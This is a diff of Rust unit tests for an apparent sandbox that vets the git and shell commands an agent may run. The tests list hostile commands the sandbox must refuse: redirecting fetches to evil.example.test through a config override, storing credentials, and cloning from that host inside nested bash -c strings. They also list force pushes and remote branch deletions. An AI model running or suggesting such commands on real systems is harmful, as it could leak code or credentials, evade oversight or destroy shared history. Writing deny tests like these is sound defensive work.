@@ -1285,7 +1374,7 @@ mod tests {
             "git -c url.https://evil.example.test/.insteadOf=https://git.example.test/ fetch origin",
             "git -c credential.helper=store push origin main",
         ] {
-            let error = authorize_shell_command(command, Some(&grant)).unwrap_err();
+            let error = check_granted(command, &grant).unwrap_err();
             assert!(
                 matches!(error, SandboxError::CapabilityDenied { .. }),
                 "{command}: {error}"
@@ -1294,42 +1383,65 @@ mod tests {
     }
 
     #[test]
-    fn force_pushes_and_remote_ref_deletions_are_refused() {
-        let (temp, grant) = workspace_with_remote();
+    fn clone_options_cannot_hide_the_literal_source_from_preflight() {
+        let (_temp, grant) = workspace_with_remote();
+        for option in ["-c", "--config", "--conf"] {
+            let args = tokenize_simple_commands(&format!("{option} user.name=fixture"));
+            let error = authorize_clone(
+                &args[0],
+                Preflight {
+                    grant: Some(&grant),
+                    offline: false,
+                },
+            )
+            .unwrap_err();
+            assert!(error.to_string().contains("unsupported option"), "{error}");
+        }
+        check_granted(
+            "git clone --depth=1 -- /workspace/remotes/origin.git copy",
+            &grant,
+        )
+        .unwrap();
+    }
+
+    #[test]
+    fn preflight_refuses_push_before_git_can_interpret_flags_or_defaults() {
+        let (_temp, grant) = workspace_with_remote();
         for command in [
+            "git push",
+            "git push origin main",
+            "git push --repo origin",
             "git push --force origin main",
             "git push -f origin main",
+            "git push -qf origin main",
             "git push origin +main",
             "git push --force-with-lease origin main",
             "git push --force-with-lease=main origin main",
             "git push --mirror origin",
+            "git push --mirr origin",
             "git push --delete origin old-branch",
+            "git push --del origin old-branch",
             "git push origin :old-branch",
             "git push --prune origin",
         ] {
-            let error = authorize_shell_command(command, Some(&grant)).unwrap_err();
+            let error = check_granted(command, &grant).unwrap_err();
             assert!(
                 matches!(error, SandboxError::CapabilityDenied { .. }),
                 "{command}: {error}"
             );
-            assert!(error.to_string().contains("git-remotes"), "{error}");
+            assert!(
+                error.to_string().contains("git push is not supported"),
+                "{error}"
+            );
         }
-        // A normal push to the granted local remote actually works.
-        let status = Command::new("git")
-            .args(["init", "--bare", "-q"])
-            .current_dir(temp.path().join("remotes/origin.git"))
-            .status()
-            .expect("git");
-        assert!(status.success());
-        authorize_shell_command("git push origin main", Some(&grant)).unwrap();
     }
 
     #[test]
     fn quotes_and_nested_shell_text_are_scanned_conservatively() {
         let (_temp, grant) = workspace_with_remote();
-        authorize_shell_command(
+        check_granted(
             "echo 'git clone https://evil.example.test/repo.git'",
-            Some(&grant),
+            &grant,
         )
         .unwrap();
         for command in [
@@ -1339,90 +1451,9 @@ mod tests {
             "bash -lc \"git clone https://evil.example.test/repo.git\"",
             "bash -c 'git fetch upstream'",
         ] {
-            assert!(
-                authorize_shell_command(command, Some(&grant)).is_err(),
-                "{command}"
-            );
+            assert!(check_granted(command, &grant).is_err(), "{command}");
         }
-        let error = authorize_shell_command("bash -c \"$SCRIPT\"", Some(&grant)).unwrap_err();
+        let error = check_granted("bash -c \"$SCRIPT\"", &grant).unwrap_err();
         assert!(error.to_string().contains("dynamic"), "{error}");
-    }
-
-    #[test]
-    fn a_local_remote_clone_and_push_are_pinned_by_real_git() {
-        static GIT: OnceLock<bool> = OnceLock::new();
-        let has_git = *GIT.get_or_init(|| {
-            Command::new("git")
-                .arg("--version")
-                .output()
-                .is_ok_and(|output| output.status.success())
-        });
-        if !has_git {
-            eprintln!("git not installed; skipping local remote pin");
-            return;
-        }
-        let temp = tempfile::tempdir().unwrap();
-        let workspace = temp.path().canonicalize().unwrap();
-        let remote = workspace.join("remotes/origin.git");
-        std::fs::create_dir_all(&remote).unwrap();
-        let run = |dir: &Path, args: &[&str]| {
-            let output = Command::new("git")
-                .args(args)
-                .current_dir(dir)
-                .env("GIT_AUTHOR_NAME", "test")
-                .env("GIT_AUTHOR_EMAIL", "test@example.test")
-                .env("GIT_COMMITTER_NAME", "test")
-                .env("GIT_COMMITTER_EMAIL", "test@example.test")
-                .env("GIT_TERMINAL_PROMPT", "0")
-                .output()
-                .expect("git");
-            assert!(
-                output.status.success(),
-                "git {args:?}: {}",
-                String::from_utf8_lossy(&output.stderr)
-            );
-        };
-        run(&remote, &["init", "--bare", "-q"]);
-        run(
-            &workspace,
-            &["clone", "-q", remote.to_str().unwrap(), "work"],
-        );
-        let work = workspace.join("work");
-        std::fs::write(work.join("README"), "hello\n").unwrap();
-        run(&work, &["add", "README"]);
-        run(&work, &["commit", "-q", "-m", "initial"]);
-        run(&work, &["push", "-q", "origin", "HEAD:refs/heads/main"]);
-
-        let host = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
-            .unwrap()
-            .unwrap();
-        let grant =
-            authorize_grant(&host, &[], &workspace, SandboxNetworkMode::ProxyEnforced).unwrap();
-        // The container sees the virtual /workspace spelling; the host path
-        // is a different spelling and stays refused (checked below).
-        authorize_shell_command(
-            "git clone /workspace/remotes/origin.git clone-two",
-            Some(&grant),
-        )
-        .unwrap();
-        assert!(
-            authorize_shell_command(
-                &format!("git clone {} clone-two", remote.display()),
-                Some(&grant)
-            )
-            .is_err()
-        );
-        run(
-            &workspace,
-            &["clone", "-q", remote.to_str().unwrap(), "clone-two"],
-        );
-        assert!(workspace.join("clone-two/.git").is_dir());
-        authorize_shell_command("git push origin main", Some(&grant)).unwrap();
-        let heads = Command::new("git")
-            .args(["rev-parse", "refs/heads/main"])
-            .current_dir(&remote)
-            .output()
-            .expect("git");
-        assert!(heads.status.success());
     }
 }
